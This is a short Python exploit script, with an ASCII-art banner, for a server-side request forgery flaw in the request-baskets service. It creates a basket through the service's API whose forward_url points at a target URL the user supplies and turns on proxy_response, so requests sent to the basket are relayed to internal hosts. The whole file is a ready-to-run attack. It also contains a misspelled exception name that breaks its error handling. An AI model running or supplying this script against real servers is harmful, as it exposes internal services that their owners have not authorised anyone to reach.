print(r'''

       _   _     _      _   _      _   ___     _  
      | | | |   | |    | | (_)    | | / (_)   | | 
  __ _| |_| |__ | | ___| |_ _  ___| |/ / _  __| | 
 / _` | __| '_ \| |/ _ \ __| |/ __|    \| |/ _` | 
| (_| | |_| | | | |  __/ |_| | (__| |\  \ | (_| | 
 \__,_|\__|_| |_|_|\___|\__|_|\___\_| \_/_|\__,_| 
                                                  
                                                  

''')



import sys
import requests
import json
import random
import string

def generate_basket_name(length=6):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

def main():
        print(f"---------------Exploit SSRF for request-baskets---------------")

        if len(sys.argv)!=3:
                print(f"Usage: python3 {sys.argv[0]} <public_url> <target_url>")
                sys.exit(1)
        public_url= sys.argv[1].rstrip('/')
        target_url= sys.argv[2]
        basket_name=generate_basket_name()
        api_url=f"{public_url}/api/baskets/{basket_name}"

        payload={
                "forward_url": target_url,
                "proxy_response": True,
                "insecure_tls": False,
                "expand_path": True,
                "capacity": 250
        }

        try:
                response=requests.post(api_url,json=payload,timeout=3)
                if response.status_code==201:
                        print(f"[+] Successful! Basket created: {basket_name}")
                        print(f"[+] Send requests to: {public_url}/{basket_name} -> forwarded to {target_url}")
        except Exceptio as e:
                print(f"Failed: {e}")


if __name__=="__main__":
        main();
                
